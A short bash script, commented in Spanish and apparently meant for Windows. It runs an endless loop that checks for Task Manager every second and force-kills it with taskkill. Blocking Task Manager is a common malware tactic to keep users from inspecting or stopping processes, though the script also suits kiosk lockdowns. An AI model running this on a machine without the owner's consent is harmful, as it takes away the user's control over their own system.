#!/bin/bash

echo "🚀 Bloqueo del Administrador de Tareas iniciado..."

while true; do
    # Buscar el proceso Taskmgr.exe
    tasklist | grep -i "Taskmgr.exe" > /dev/null

    # Si se encuentra, lo mata
    if [ $? -eq 0 ]; then
        echo "⛔ Task Manager detectado, cerrándolo..."
        taskkill /F /IM Taskmgr.exe > /dev/null 2>&1
    fi

    # Espera 1 segundo antes de verificar nuevamente
    sleep 1
done
